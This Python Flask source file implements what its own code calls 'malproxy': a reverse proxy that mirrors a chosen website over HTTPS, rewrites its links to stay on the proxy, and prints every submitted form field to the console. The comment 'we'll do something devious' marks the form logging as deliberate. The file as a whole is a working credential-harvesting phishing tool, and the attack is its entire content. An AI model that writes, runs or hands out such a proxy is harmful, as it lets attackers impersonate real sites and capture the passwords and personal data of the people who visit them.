from flask import Flask, request, Response
from urllib.parse import urlparse
import requests
import sys
import re

app = Flask('main', static_folder=None)
WEBSITE = 'example.com'
link = ''


@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
def malproxy(path):
    global WEBSITE
    # A link variable which contains the scheme in addition to the netloc
    global link
    parsed = urlparse(WEBSITE)
    # The internet relies on trust, but for these purposes we'll pretend not to be a bot
    uaHeader = request.headers.get('user-agent')
    link = WEBSITE
    if(not parsed.scheme):
        link = f'https://{WEBSITE}'
    # In the case of a post request, we'll do something devious...
    if(request.method == 'POST'):
        for key in request.form:
            print(f'{key}: {request.form[key]}')
    r = requests.request(request.method, f'{link}{path}', headers={'user-agent':uaHeader})
    contentType = r.headers.get('Content-Type')
    # In case of html text, replace all the links
    if('text/html' in contentType):
        return replaceurls(r.text)
    return r.content

# If the user accesses any paths at the same netloc, we want to continue proxying
@app.route('/<path:path>', methods=['POST', 'GET'])
def proxycont(path):
    uaHeader = request.headers.get('user-agent')
    if(request.method == 'POST'):
        for key in request.form:
            print(f'{key}: {request.form[key]}')
    r = requests.request(request.method, f'{link}/{path}', headers={'user-agent':uaHeader})
    contentType = r.headers.get('Content-Type')
    if('text/html' in contentType):
        return replaceurls(r.text)
    return r.content

def replaceurls(text):
        global WEBSITE
        # find all instances of hyperlinks, and edit them starting from the penultimate link
        links = [m.start() for m in re.finditer('<a ', text)]
        links.reverse()
        newResponse = text
        pattern = re.compile("""(?<=href=)("|')(.*?)("|')""")
        # Find the indices of each link, then replace with a proxy link
        for instance in links:
            m = pattern.search(text, instance)
            if m:
                rawLink = m.group()
            else:
                continue
            strippedLink = rawLink.strip('"')
            someURL = urlparse(strippedLink)
            if(someURL.netloc == WEBSITE or someURL.netloc == f'www.{WEBSITE}'):
                indexPair = m.span()
                myurl = request.url
                selfParsed = urlparse(myurl)
                replaced = someURL._replace(netloc=selfParsed.netloc)
                newurl = replaced.geturl()
                newResponse = f'{newResponse[0:indexPair[0]]}"{newurl}"{newResponse[indexPair[1]:]}'
        return newResponse

    

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('ERROR: Website not provided.')
        exit(1)

    WEBSITE = sys.argv[1]
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')


